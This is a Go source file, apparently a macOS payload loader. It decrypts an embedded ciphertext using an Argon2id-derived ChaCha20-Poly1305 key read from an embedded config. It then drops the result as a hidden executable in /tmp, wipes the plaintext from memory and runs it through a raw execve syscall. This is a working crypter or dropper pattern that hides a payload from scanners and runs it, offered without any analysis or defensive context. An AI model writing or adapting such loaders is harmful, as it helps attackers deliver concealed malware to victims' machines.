package main

import (
	_ "embed"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/crypto/argon2"
	"golang.org/x/crypto/chacha20poly1305"
)

//go:embed encrypted_Input.bin
var encryptedBytes []byte

//go:embed config.txt
var configData string

// Default Argon2 parameters
const (
	argonTime    = 1
	argonMemory  = 64 * 1024
	argonThreads = 4
	argonKeyLen  = chacha20poly1305.KeySize
)

func main() {
	machoBytes, err := decryptFile()
	if err != nil {
		log.Fatalf("Failed to decrypt file: %v", err)
	}
	executeMachO(machoBytes)
}

func decryptFile() ([]byte, error) {
	// Parse config data (password, salt, nonce)
	lines := strings.Split(strings.TrimSpace(configData), "\n")
	if len(lines) < 3 {
		return nil, fmt.Errorf("invalid config data format")
	}

	password, err := hex.DecodeString(lines[0])
	if err != nil {
		return nil, err
	}

	salt, err := hex.DecodeString(lines[1])
	if err != nil {
		return nil, err
	}

	nonce, err := hex.DecodeString(lines[2])
	if err != nil {
		return nil, err
	}

	// Derive the key using the same Argon2id parameters
	key := argon2.IDKey(password, salt, argonTime, argonMemory, argonThreads, argonKeyLen)

	aead, err := chacha20poly1305.New(key)
	if err != nil {
		return nil, err
	}

	// Decrypt and verify the data
	decryptedBytes, err := aead.Open(nil, nonce, encryptedBytes, nil)
	if err != nil {
		return nil, err
	}

	return decryptedBytes, nil
}

// generateRandomString creates a random string of specified length
func generateRandomString(length int) (string, error) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := range result {
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
		if err != nil {
			return "", err
		}
		result[i] = charset[n.Int64()]
	}
	return string(result), nil
}

// secureOverwrite overwrites a byte slice with random data followed by zeros for security
func secureOverwrite(data []byte) {
	// First overwrite with random data
	rand.Read(data)
	
	// Then overwrite with zeros
	for i := range data {
		data[i] = 0
	}
	
	// Force garbage collection to potentially release memory
	runtime.GC()
}

// executeMachO handles the Mach-O binary execution process
func executeMachO(machoBytes []byte) {
	// Create a random filename in /tmp
	randomStr, err := generateRandomString(12)
	if err != nil {
		log.Fatalf("Failed to generate random string: %v", err)
	}
	tmpPath := filepath.Join("/tmp", "."+randomStr)
	
	log.Printf("Dropping decrypted Mach-O binary to: %s", tmpPath)
	
	// Write the decrypted Mach-O binary to the temporary file
	if err := ioutil.WriteFile(tmpPath, machoBytes, 0700); err != nil {
		log.Fatalf("Failed to write temporary file: %v", err)
	}
	
	// Make sure the file is executable
	if err := os.Chmod(tmpPath, 0700); err != nil {
		log.Fatalf("Failed to make file executable: %v", err)
	}
	
	// Prepare for execve
	pathPtr, err := syscall.BytePtrFromString(tmpPath)
	if err != nil {
		log.Fatalf("Failed to convert path to byte pointer: %v", err)
	}
	
	// Create null-terminated argument array
	argv := []*byte{pathPtr, nil}
	
	// Keep a copy of the path for error reporting and cleanup
	pathCopy := tmpPath
	
	// Securely wipe the decrypted binary from memory
	log.Printf("Securely wiping %d bytes of decrypted binary from memory", len(machoBytes))
	secureOverwrite(machoBytes)
	
	// Verify the file exists and is executable before attempting to execute it
	if _, err := os.Stat(tmpPath); err != nil {
		log.Fatalf("Error: File does not exist or cannot be accessed: %v", err)
	}
	
	log.Printf("Executing binary at: %s", tmpPath)
	
	// Get the current environment variables to pass to the executed binary
	env := os.Environ()
	envPtrs := make([]*byte, len(env)+1) // +1 for nil terminator
	for i, e := range env {
		envPtrs[i], err = syscall.BytePtrFromString(e)
		if err != nil {
			log.Printf("Warning: Failed to convert env var to byte pointer: %v", err)
		}
	}
	envPtrs[len(env)] = nil // Null terminator
	
	// Execute the binary using execve with environment variables
	// This replaces the current process with the new one
	_, _, errno := syscall.RawSyscall(syscall.SYS_EXECVE, 
		uintptr(unsafe.Pointer(pathPtr)), 
		uintptr(unsafe.Pointer(&argv[0])), 
		uintptr(unsafe.Pointer(&envPtrs[0])))
	
	// If we reach here, execve failed
	// Now we can unlink the file since execve failed
	if err := syscall.Unlink(tmpPath); err != nil {
		log.Printf("Warning: Failed to unlink temporary file: %v", err)
	}
	
	// Securely overwrite the path string
	log.Printf("Securely wiping path string from memory")
	pathBytes := []byte(pathCopy)
	secureOverwrite(pathBytes)
	
	// Attempt to overwrite any other sensitive data in memory
	runtime.GC()
	
	log.Fatalf("Failed to execute binary: %v (errno: %d)", errno, errno)
} 